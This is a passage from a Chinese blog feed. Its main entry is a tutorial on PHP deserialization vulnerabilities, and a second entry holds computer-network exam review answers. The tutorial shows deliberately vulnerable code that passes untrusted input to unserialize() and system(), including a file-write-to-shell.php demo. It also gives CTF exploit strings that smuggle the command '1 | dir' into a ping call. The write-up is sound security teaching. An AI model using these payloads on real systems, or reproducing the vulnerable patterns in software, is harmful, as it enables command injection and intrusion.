class="keyword">public</span> $sex = <span class="string">"woman"</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="string">"7"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$example = <span class="keyword">new</span> DemoClass();<span class="comment">//生成新对象</span></span><br><span class="line"><span class="keyword">echo</span> serialize($example);<span class="comment">//输出结果：O:9:"DemoClass":3:&#123;s:4:"name";s:6:"hahaha";s:3:"sex";s:5:"woman";s:3:"age";s:1:"7";&#125;</span></span><br><span class="line"></span><br><span class="line">$example-&gt;name = <span class="string">"yinfeng"</span>;</span><br><span class="line">$example-&gt;sex = <span class="string">"man"</span>;</span><br><span class="line">$example-&gt;age = <span class="string">"18"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($example);<span class="comment">//输出结果：O:9:"DemoClass":3:&#123;s:4:"name";s:7:"yinfeng";s:3:"sex";s:3:"man";s:3:"age";s:2:"18";&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$val = serialize($example);</span><br><span class="line">$NewExample = unserialize($val);</span><br><span class="line">print_r($NewExample);</span><br><span class="line"><span class="keyword">echo</span> $NewExample-&gt;name;<span class="comment">//输出结果：yinfeng</span></span><br><span class="line"><span class="keyword">echo</span> $NewExample-&gt;sex;<span class="comment">//输出结果：man</span></span><br><span class="line"><span class="keyword">echo</span> $NewExample-&gt;age;<span class="comment">//输出结果：18</span></span><br></pre></td></tr></table></figure><p>针对其中的代码分析，可以看到<code>serialize</code>序列化对象后（<code>echo serialize($example);</code>），得到的是<code>O:9:&quot;DemoClass&quot;:3:{s:4:&quot;name&quot;;s:7:&quot;yinfeng&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;}</code>；而<code>unserialize</code>序列化对象后（<code>print_r($NewExample);</code>）。 下图呈现两种函数执行形式：</p><p><img src="/2019/03/20/serialize与unserialize/1552956021755.png" alt="1552956021755"></p><p>可以看到<code>serialize</code>序列化对象，得到的是对象引用类的字符串输出，<code>unserialize</code>得到的结果与之相反，将对象引用类的字符串输出转化为类中引用值的呈现模式。</p><h3 id="深入栗子"><a href="#深入栗子" class="headerlink" title="深入栗子"></a>深入栗子</h3><p>在php官方的简述中，有以下红标记的描述，提到了<code>__sleep（）</code>和<code>__wakeup()</code>,只是啥呢，以第一个栗子引申出来剖析</p><p><img src="/2019/03/20/serialize与unserialize/1552959481831.png" alt="1552959481831"></p><p>还是一样的代码，不过类中我们加了一些东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'Tom'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __sleep() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __construct() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"------------------0--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$a=<span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"------------------1--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$a_value=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a_value.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"------------------2--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$a_uns=unserialize($a_value);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"------------------3--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">print_r($a_uns);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>.<span class="string">"------------------4--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure><p><code>__wakeup()</code>、<code>__construct()</code>、<code>__destruct()</code>这三个函数是干嘛的呢</p><ul><li>构造函数<code>__construct()</code>：当对象创建(new)时会自动调用。但在<code>unserialize()</code>时是不会自动调用的。</li><li>析构函数<code>__destruct()</code>：当对象被销毁时会自动调用。</li><li>魔法函数<code>__wakeup()</code> ：<code>unserialize()</code>时会自动调用。</li></ul><p>我们先来看看运行结果：</p><p><img src="/2019/03/20/serialize与unserialize/1552982483785.png" alt="1552982483785"></p><p>可以看到，在创建<code>a</code>对象时，自动调用了<code>__construct（）</code>；<code>serialize($a)</code>时调用<code>__sleep</code>函数；<code>unserialize($a_value)</code>时调用了<code>__wakeup()</code>。</p><p>而在其中，不知你是否发现其中<code>__sleep()</code>我是这样写的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __sleep() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>相对于其他函数，多了个<code>return array(&quot;name&quot;);</code>，为什么呢？</p><p>在<code>php</code>文档中，针对这个原因，是这样描述的</p><p><img src="/2019/03/20/serialize与unserialize/1552981443700.png" alt="1552981443700"></p><p>其中，不知你看到这句没</p><p><img src="/2019/03/20/serialize与unserialize/1552982878692.png" alt="1552982878692"></p><p>我们试试没有<code>return</code>返回值的情况</p><p><img src="/2019/03/20/serialize与unserialize/1552983144120.png" alt="1552983144120"></p><p>不加这句的后果，如下图：</p><p><img src="/2019/03/20/serialize与unserialize/1552983410764.png" alt="1552983410764"></p><p>那如果，我返回的值设置不是<code>name</code>时，即这里改为<code>return array(&quot;namef&quot;);</code>，以下是报错结果</p><p><img src="/2019/03/20/serialize与unserialize/1552982312376.png" alt="1552982312376"></p><p>这样的描述，是否能更好解决你的疑问呢？</p><h3 id="构造栗子"><a href="#构造栗子" class="headerlink" title="构造栗子"></a>构造栗子</h3><p>现在我们看看下面这段代码，尝试加在刚刚的代码后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$Str_1 = <span class="string">'O:1:"A":1:&#123;s:4:"name";s:4:"Anny";&#125;'</span>;</span><br><span class="line">$Un_serialize = unserialize($Str_1);        <span class="comment">//使用unserialize回调__wakeup</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"------------------5--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">print_r($Un_serialize);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><p>也许你注意到了<code>$Str_1</code>的值，没错，这次我们通过自行构造一个<code>name</code>为<code>Anny</code>，看看反序列化后的值。</p><p><img src="/2019/03/20/serialize与unserialize/1552994154348.png" alt="1552994154348"></p><p>这里就需要我们想想，反序列化的漏洞是如何体现的呢？本质原因就是我们可以构造一串伪造的字符串，通过<code>unserialize</code>函数，覆盖掉原本类成员变量的默认值。这一点就像C语言中的构造函数，传入的值会取代原本其成员变量的默认值。</p><p>有兴趣的同学可以试试下面的$Str_1的替换，看看会产生什么结果？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Str_1 = <span class="string">'O:14:"Test_serialize":1:&#123;s:4:"name";s:4:"test";&#125;'</span>;</span><br></pre></td></tr></table></figure><p>你能直观的看到，应是下面的内容</p><p><img src="/2019/03/20/serialize与unserialize/1552994528361.png" alt="1552994528361"></p><p>再对比下图</p><p><img src="/2019/03/20/serialize与unserialize/1552994607461.png" alt="1552994607461"></p><p>发现了没，析构函数多了一个？<code>__wakeup</code>函数也多了？这是不是意味着什么呢？</p><p>说了这么多，烦了嘛？接下来，我们来模拟下漏洞场景吧！</p><p>在前面我们提到过，<code>unserialize()</code>时会自动调用魔法函数<code>__wakeup()</code> 。这个漏洞的关键点就在于如何通过<code>__wakeup()</code>中的执行语句，执行危险命令，下面是个简单模拟，在<code>__wakeup()</code>中我们只是输出引用的<code>name</code>的值（那假如<code>__wakeup()</code>中存在其他的**命令呢？）</p><p><img src="/2019/03/20/serialize与unserialize/1552995418499.png" alt="1552995418499"></p><p>再挑白点，看看下面的例子</p><p><img src="/2019/03/20/serialize与unserialize/1552995908480.png" alt="1552995908480"></p><p>如果我将<code>Anny</code>再改成其他，后果可想而知。</p><p><img src="/2019/03/20/serialize与unserialize/1552997497869.png" alt="1552997497869"></p><h3 id="再构栗子"><a href="#再构栗子" class="headerlink" title="再构栗子"></a>再构栗子</h3><h4 id="两个不同类，在一个类中调用另一个类的对象"><a href="#两个不同类，在一个类中调用另一个类的对象" class="headerlink" title="两个不同类，在一个类中调用另一个类的对象"></a>两个不同类，在一个类中调用另一个类的对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Class Object_serialize&#123;</span><br><span class="line">    var $name = &apos;Tom&apos;;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        // TODO: Implement __wakeup() method.</span><br><span class="line">        echo &quot;__wakeup&quot;;</span><br><span class="line">        echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        echo $this-&gt;name;</span><br><span class="line">        $test = new Object_Example($this-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class Object_Example&#123;</span><br><span class="line">    function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;);</span><br><span class="line">        fwrite($fp,$name);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//$username = &apos;O:16:&quot;Object_serialize&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;Jnny&quot;;&#125;&apos;;</span><br><span class="line">$username = $_GET[&apos;username&apos;];</span><br><span class="line">print_r($username);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">$b = unserialize($username);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;.&quot;--------------------------------------&quot;.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">require &quot;getshell.php&quot;;</span><br></pre></td></tr></table></figure><p>通过<code>username</code>传入构造好的序列化字符串后，进行反序列化时自动调用 <code>__wakeup()</code>函数，从而在<code>Object_serialize</code>会自动调用对象<code>test</code>的类<code>Object_Example</code>中的<code>__construct()</code>方法，从而写入到东西到文件中。</p><h3 id="炭烤栗子"><a href="#炭烤栗子" class="headerlink" title="炭烤栗子"></a>炭烤栗子</h3><p>某次比赛<code>test.php</code>源码（<code>2018fj</code>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ping -c 2 $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">$a=@$_POST[<span class="string">'a'</span>];</span><br><span class="line">@unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看看上面的代码，首先执行就两句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=@$_POST[&apos;a&apos;];</span><br><span class="line">@unserialize($a);</span><br></pre></td></tr></table></figure><p>传入<code>post</code>的数据，然后反序列化该值。我们知道，<code>unserialize()</code>函数执行后，会自动执行<code>__wakeup()</code>预备执行对象的资源，进行初始化。而当<code>__wakeup()</code>函数执行完后，会调用析构函数<code>__destruct()</code>释放资源，仔细观察 <code>__wakeup()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function __wakeup()&#123;</span><br><span class="line">        foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现反序列化的值会被其中<code>waf</code>()进行空格过滤，如下图</p><p><img src="/2019/03/20/serialize与unserialize/1553070235661.png" alt="1553070235661"></p><p>再接着调用了<code>__destruct()</code>，方便观察我把每个函数执行的过程呈现出来</p><p><img src="/2019/03/20/serialize与unserialize/1553070491839.png" alt="1553070491839"></p><p>其中语句<code>call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</code>，指的是回调当前类<code>$this</code>的<code>$this-&gt;method</code>方法，<code>$this-&gt;args</code>为传入的<code>$this-&gt;method</code>方法的参数值。在本题中就是往<code>test</code>类的<code>ping()</code>中传入了一个<code>$host</code>为类变量<code>$args</code>的值，随后通过构造好的反序列化的字符串，我们拿到了想要的东西。</p><p><img src="/2019/03/20/serialize与unserialize/1553070745585.png" alt="1553070745585"></p><p><code>exp:a=O:4:&quot;home&quot;:2:{s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:{i:0;s:7:&quot;1 | dir&quot;;}}</code></p><p>至于其中为啥跟我们之前将的不一样，构造时，我们加入了在私有成员变量<code>method</code>前加了个<code>%00home%00</code>，这是因为当成员变量是私有的时候，会在成员变量前面添加类名；当成员变量是被保护的时候，会在被保护成员前面添加一个<code>*</code>，并且，在所添加的类名或者<code>*</code>的左右两边都会有一个<code>null</code>字节，也就是<code>%00</code>，因此，长度都增加了<code>2</code>。下面给出不一样的代码，请大伙自行尝试构造<code>exp</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line">    </span><br><span class="line">    protected $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args) &#123;</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;ping&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function ping($host)&#123;</span><br><span class="line">        system(&quot;ping -c 2 $host&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)&#123;</span><br><span class="line">        $str=str_replace(&apos; &apos;,&apos;&apos;,$str);</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">$a=@$_POST[&apos;a&apos;];</span><br><span class="line">@unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>exp:a=O:4:&quot;home&quot;:2:{s:9:&quot;%00*%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:{i:0;s:7:&quot;1 | dir&quot;;}}</code></p><p>关于序列化的问题，发现并不是很难，只要代码看的懂，执行步骤明白，知道漏洞的原理，没有想象的那么难，这篇还没完，持续更新，关于反序列化这只是冰山一角。青山不改，绿水长流。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;相对于网上其他关于Serialize的讲解，不下万篇，学习笔记，稍微总结一番。本篇文章按照&lt;a href=&quot;https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;浅谈php反序列化漏洞&lt;/a&gt;，进行学习指导，基础内容略过。&lt;/p&gt;
    
    </summary>
    
    
      <category term="php" scheme="https://jianghuxia.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络期末复习</title>
    <link href="https://jianghuxia.github.io/2019/01/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"/>
    <id>https://jianghuxia.github.io/2019/01/09/计算机网络期末复习/</id>
    <published>2019-01-09T12:36:07.000Z</published>
    <updated>2019-01-13T14:45:39.328Z</updated>
    
    <content type="html"><![CDATA[<p>期末复习，一起愉快地复习吧！</p><p><strong>2019-01-13 基本更新完毕，如有补充，私聊哦~</strong></p><a id="more"></a><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p>WAN、MAN、LAN、PAN、WPAN、AN、WLAN、ISP、NAP、IXP、OSI/RM、DNS、HTTP、FTP、SMTP、ICMP、IGMP、DHCP、PDU、SAP、SDU、QAM、ADSL、HFC、PPP、LCP、NCP、CRC、FCS、HDLC、CSMA/CD、DIX Ethernet V2、IEEE802.3、STP、IP、ARP、IGP、RIP、OSPF、EGP、BGP、VPN、NAT、API</p><p>OSPF（Open Shortest Pass First,开放最短路径优先协议）</p><p>FDM(frequency division multiplexing) 频分复用</p><p>TDM(Time Division Multiplexing) 时分多路复用</p><p>STDM(Statistic Time Division Multiplexing)统计时分复用</p><p>WDM(Wave Division Multiplexing) 波分复用</p><p>DWDM(Dense Wave Division Multiplexing) 密集波分复用</p><p>CDMA(Code Wave Division Multiplexing)码分多址</p><h2 id="大题"><a href="#大题" class="headerlink" title="大题"></a>大题</h2><h3 id="P39-1-17"><a href="#P39-1-17" class="headerlink" title="P39-1-17"></a><code>P39-1-17</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">收发两端之间的传输距离为1000km，信号在媒体上的传播速率为2×108m/s。试计算以下两种情况的发送时延和传播时延： （1） 数据长度为107bit,数据发送速率为100kb/s。 （2） 数据长度为103bit,数据发送速率为1Gb/s。 从上面的计算中可以得到什么样的结论？</span><br></pre></td></tr></table></figure><p>解：</p><p>（1）发送时延：ts=107/105=100s 传播时延tp=106/(2×108)=0.005s </p><p>（2）发送时延ts =103/109=1µs 传播时延：tp=106/(2×108)=0.005s </p><p>结论：若数据长度大而发送速率低，则在总的时延中，发送时延往往大于传播时延。但若数据长度短而发送速率高，则传播时延就可能是总时延中的主要成分。</p><h3 id="P39-1-19"><a href="#P39-1-19" class="headerlink" title="P39-1-19"></a><code>P39-1-19</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">长度为100字节的应用层数据交给传输层传送，需加上20字节的TCP首部。再交给网络层传送，需加上20字节的IP首部。最后交给数据链路层的以太网传送，加上首部和尾部工18字节。试求数据的传输效率。数据的传输效率是指发送的应用层数据除以所发送的总数据（即应用数据加上各种首部和尾部 的额外开销）。若应用层数据长度为1000字节，数据的传输效率是多少？</span><br></pre></td></tr></table></figure><p>解：</p><p>（1）100/（100+20+20+18）=63.3% </p><p>（2）1000/（1000+20+20+18）=94.5%</p><h3 id="P39-1-28"><a href="#P39-1-28" class="headerlink" title="P39-1-28"></a><code>P39-1-28</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">28、假定要在网络上传送1.5MB的文件。设分组长度为1KB，往返时间RTT=80ms。传送数据之前还需要有建立TCP连接的时间，这时间是2×RTT=160ms。试计算在以下几种情况下接收方收完该文件的最后一个比特所需的时间。</span><br><span class="line"></span><br><span class="line">（1）数据发送速率为10Mb/s，数据分组可以连续发送。</span><br><span class="line"></span><br><span class="line">（2）数据发送速率为10Mb/s，但每发送完一个分组后要等待一个RTT时间才能再发送一个分组。</span><br><span class="line"></span><br><span class="line">（3）数据发送速率极快，可以不考虑发送数据所需的时间。但规定在每一个RTT往返时间内只能发送20个分组。</span><br><span class="line"></span><br><span class="line">（4）数据发送速率极快，可以不考虑发送数据所需的时间。但在第一个RTT往返时间内只能发送一个分组，在第二个RTT内可发送两个分组，在第三个RTT内可发送四个分组（即23-1=22=4个分组）</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/计算机网络期末复习/1547383428085.png" alt="1547383428085"></p><h3 id="P67-2-07"><a href="#P67-2-07" class="headerlink" title="P67-2-07"></a><code>P67-2-07</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">假定某信道受奈氏准则限制的最高码元速率为80000码元/秒.如果采用振幅调制,把码元的振幅划分为16个不同等级来传送,那么可以获得多高的数据率（b/s）?</span><br></pre></td></tr></table></figure><p>参考如下：</p><p><img src="/2019/01/09/计算机网络期末复习/1547025647017.png" alt="1547025647017"></p><h3 id="P67-2-13"><a href="#P67-2-13" class="headerlink" title="P67-2-13"></a><code>P67-2-13</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么要使用信道复用技术？常用的信道复用技术有哪些？</span><br></pre></td></tr></table></figure><p> 答：</p><p>为了通过共享信道、最大限度提高信道利用率。</p><p>常用的信道复用技术有：频分复用、时分复用、统计时分复用、波分复用、码分复用等</p><h3 id="P68-2-16"><a href="#P68-2-16" class="headerlink" title="P68-2-16"></a><code>P68-2-16</code></h3><p><img src="/2019/01/09/计算机网络期末复习/1547032544337.png" alt="1547032544337"></p><p>解：</p><p>S·A=（＋1－1＋3＋1－1＋3＋1＋1）／8=1， A发送1 </p><p>S·B=（＋1－1－3－1－1－3＋1－1）／8=-1， B发送0 